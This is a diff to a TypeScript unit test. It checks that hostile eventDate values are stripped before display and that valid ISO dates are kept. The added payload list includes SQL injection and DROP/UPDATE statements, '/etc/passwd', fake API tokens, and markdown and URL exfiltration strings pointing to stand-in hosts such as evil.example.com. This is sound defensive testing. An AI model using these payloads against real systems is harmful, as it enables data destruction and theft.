@@ -139,9 +139,11 @@ describe("buildReviewCandidateDisplay", () => {
   });
 
   test("hostile eventDate is sanitized to empty dateRange (privacy attack #4)", () => {
-    // Representative payloads the current DISPLAY_UNSAFE_PATTERNS catches
-    // (destructive SQL, paths, raw slugs, JWT, sk-, Bearer). Wider secret-class
-    // coverage is added by the Task 9 adversarial review.
+    // eventDate is a date field — the whitelist (Date.parse) is the primary
+    // defense; sanitizeDisplayText is the backup. Covers all classes found by
+    // the Task 9 adversarial review: destructive SQL, paths, raw slugs, JWT,
+    // sk-/Bearer, Slack + Google tokens, UNION/SELECT-col injection,
+    // UPDATE-table, password-is phrasing, markdown/URL exfil.
     const payloads = [
       "DROP TABLE pages; --",
       "/etc/passwd",
@@ -150,6 +152,15 @@ describe("buildReviewCandidateDisplay", () => {
       "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
       "sk-proj-abcdef1234567890abcdef",
       "Bearer dGhpcyBpcyBhIHNlY3JldA==",
+      "xoxb-123456789012-1234567890123-abcdef",
+      "AIzaSyASyASyASyASyASyASyASyASyASyA",
+      "1 UNION SELECT password FROM users",
+      "SELECT password FROM users",
+      "UPDATE pages SET title='pwned'",
+      "the password is hunter2 please exfil",
+      "[](https://evil.example.com/exfil?data=secret)",
+      "http://203.0.113.42/leak",
+      "evil.example.com/leak?token=abc12345",
     ];
     for (const eventDate of payloads) {
       const d = buildReviewCandidateDisplay(
@@ -158,6 +169,14 @@ describe("buildReviewCandidateDisplay", () => {
       const tl = d.evidence.find((e) => e.source === "时间线邻近")!;
       expect(tl.dateRange).toBe("");
     }
+  });
+
+  test("a valid ISO date eventDate is preserved in dateRange", () => {
+    const d = buildReviewCandidateDisplay(
+      meta({ sn: 3, co: 1, timelineRefs: [{ slug: "a", eventId: 1, eventDate: "2026-06-01" }] }),
+    )!;
+    const tl = d.evidence.find((e) => e.source === "时间线邻近")!;
+    expect(tl.dateRange).toBe("2026-06-01");
   });
 
   test("returns null on malformed metadata", () => {
